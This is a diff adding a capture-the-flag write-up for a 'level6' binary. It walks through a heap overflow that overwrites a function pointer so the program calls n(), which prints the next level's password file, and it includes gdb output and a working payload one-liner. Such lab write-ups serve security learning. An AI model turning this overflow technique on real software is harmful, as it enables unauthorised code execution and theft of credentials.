@@ -3,6 +3,42 @@ level 6
 like always we have an executabe level6
 
 containing 3 functions the one we need to focus on is n() it has a call to system
+
+the main function allocate 40 to a first variable in the heap using malloc
+then allocate to another variable 4 in the heap using malloc
+then put the address of m function into the second function
+then copy the argv[1] into the first variable
+and call the function pointed with the second variable.
+
+the m function pirnts Nope using puts and return
+
+the n function call system with "/bin/cat /home/user/level7/.pass" as arg
+
+so basically we need to write in the first cariable till it overflow to the second address in heap and put the address of n function in place of the m function to do so we need to know the diff between the first address and the second one 
+
+(gdb) r adasdasdsad
+Starting program: /home/user/level6/level6 adasdasdsad
+
+Breakpoint 1, 0x08048491 in main () # first malloc return
+(gdb) x $eax
+0x804a008:	0x00000000
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x080484a1 in main () # second malloc return
+(gdb) x $eax
+0x804a050:	0x00000000
+
+the diff between the two address is 72
+
+the address of n function is
+(gdb) x n
+0x8048454 <n>:	0x83e58955
+(gdb)
+
+0x8048454=litleendian>'\x54\x84\x04\x08'
+so the payload would be somthing like this :
+
 ./level6 $(python -c "print('A' * 72 + '\x54\x84\x04\x08')")
 
 
